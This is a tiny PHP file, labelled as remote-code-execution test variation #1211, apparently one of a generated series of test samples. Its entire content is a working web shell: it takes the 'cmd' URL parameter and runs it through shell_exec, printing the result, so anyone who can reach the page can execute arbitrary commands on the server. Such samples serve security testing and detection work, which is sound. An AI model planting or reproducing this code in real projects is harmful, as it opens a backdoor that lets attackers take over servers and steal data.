<?php
// RCE test variation #1211
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>